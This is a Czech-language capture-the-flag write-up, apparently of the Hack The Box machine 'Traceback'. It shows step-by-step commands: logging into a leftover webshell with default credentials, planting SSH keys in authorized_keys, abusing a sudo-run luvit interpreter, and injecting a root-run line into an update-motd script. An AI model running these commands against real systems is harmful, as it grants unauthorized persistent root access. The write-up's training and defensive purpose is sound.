---
layout: post
author: Tomáš Matějíček
title: "Traceback"
date: 2021-01-26
tags: linux rce ssh sudo php exploit
---
## Úvod a kontext

Traceback nezačíná nalezením nové zranitelnosti, ale rozpoznáním známého webshellu, který už na serveru běží. To je samo o sobě dobré připomenutí, že při incident response nebo pentestu nemusí být prvním cílem „najít exploit“, ale pochopit, co na hostu zůstalo po předchozí kompromitaci.

Další postup je pak čisté řetězení špatně delegovaných práv. Webshell otevře účet `webadmin`, ten může přes `sudo` spouštět interpret `luvit` jako `sysadmin`, a `sysadmin` zase může upravovat skripty v `/etc/update-motd.d`, které se spouštějí jako root při každém přihlášení. Právě poslední krok dobře zapadá do témat [Údržbové skripty a provozní automaty jako zdroj přístupů](/techniky/udrzbove-skripty-a-provozni-automaty-jako-zdroj-pristupu) a [Zápis do prostoru, který se pak vykoná nebo použije pro autentizaci](/techniky/zapis-do-prostoru-ktery-se-pak-vykona-nebo-pouzije-pro-autentizaci).

## Počáteční průzkum

### Vyhledání otevřených portů

Nejdřív ověřuji, jak malá je veřejná plocha stroje.

```bash
ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);echo $ports;nmap -p $ports -A -sC -sV -v $IP
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

Web na portu `80` vypadal nezajímavě, ale v HTML zdroji byla podstatná nápověda:

```text
Some of the best web shells that you might need
https://github.com/TheBinitGhimire/Web-Shells
```

To je silný hint, že na hostu může být některý z veřejně známých webshellů už nasazený.

## Analýza zjištění

### Nalezení `smevk.php`

Z relevantních kandidátů se rychle potvrdil `smevk.php`:

```text
http://10.10.10.181/smevk.php
```

Přihlašovací údaje byly ponechané v defaultní podobě:

```text
admin:admin
```

Jakmile takový webshell funguje, nemá smysl zůstávat u webového rozhraní déle, než je nutné. Hlavní cíl je přejít na stabilní SSH přístup.

## Získání přístupu

### Přechod na `webadmin`

Přes webshell šlo zapsat vlastní veřejný klíč do účtu `webadmin`:

```bash
echo "ssh-rsa __CENSORED__== hack@t" >> /home/webadmin/.ssh/authorized_keys
```

Tím vznikl SSH přístup:

```bash
ssh webadmin@$IP
```

### `luvit` jako `sysadmin`

Další důležitý výstup byl:

```bash
sudo -l
```

```text
(sysadmin) NOPASSWD: /home/sysadmin/luvit
```

`luvit` je Lua runtime pro Node-like skripty, takže nejde o neškodný pomocný binární soubor, ale o interpret schopný spouštět příkazy. To znamená, že jeho spuštění jako `sysadmin` je v praxi přímý code execution v tomto kontextu.

Praktický přechod vypadal takto:

```bash
sudo -u sysadmin /home/sysadmin/luvit
```

Uvnitř šlo přes `childprocess.exec` přidat vlastní klíč do `sysadmin/.ssh/authorized_keys`:

```javascript
childprocess.exec('echo "ssh-rsa __CENSORED__== hack@t" >> /home/sysadmin/.ssh/authorized_keys', print)
```

Pak už stačilo přihlášení:

```bash
ssh sysadmin@$IP
```

A potvrzení user flagu:

```bash
cat user.txt
```

```text
__CENSORED__
```

## Eskalace oprávnění

### Zapisovatelný `update-motd`

Na účtu `sysadmin` byla nejdůležitější schopnost zapisovat do `/etc/update-motd.d/`. Tyto skripty nejsou jen kosmetika pro banner po přihlášení. `pam_motd` je spouští jako root při každém loginu.

To z nich dělá ideální privesc vektor: pokud lze změnit obsah skriptu a následně vyvolat nové SSH přihlášení před obnovou původního stavu, spustí se útočníkův kód jako root. Write oprávnění se tu tedy mění v odložené root execution při loginu.

Prakticky stačilo upravit například `00-header` a přidat příkaz, který zkopíruje `sysadmin` klíč i rootovi:

```bash
echo "cp /home/sysadmin/.ssh/authorized_keys /root/.ssh/" >> /etc/update-motd.d/00-header
```

Pak už stačí okamžitě otevřít nové SSH spojení. Při loginu se modifikovaný MOTD skript vykoná jako root a zkopíruje klíč do `/root/.ssh/authorized_keys`.

Následně je možné se přihlásit jako root:

```bash
ssh root@$IP
```

A přečíst `root.txt`.

## Shrnutí klíčových poznatků

- První foothold zde nepřišel z nové exploitační techniky, ale z rozpoznání veřejně známého webshellu s ponechanými defaultními přihlašovacími údaji.
- Přechod z `webadmin` na `sysadmin` nestál na kernelové chybě, ale na právu spouštět interpret `luvit` přes `sudo`.
- Root část byla důsledkem zapisovatelných skriptů v `update-motd`, které root automaticky spouští při přihlášení.

## Co si odnést do praxe

- Známé webshelly je potřeba detekovat i jednoduchými IOC: názvy souborů, charakteristické rozhraní a defaultní přihlašovací údaje. Pokud už na serveru běží, hledání další CVE je až druhý krok.
- `sudo` právo spouštět interpreter je prakticky stejné jako právo spouštět shell. U Lua, Pythonu, Node, PHP CLI nebo podobných nástrojů je to potřeba hodnotit jako code execution.
- Skripty v `update-motd.d` a podobných login hookech jsou bezpečnostně citlivé. Pokud je může měnit neprivilegovaný uživatel, přihlášení se samo změní v root trigger.
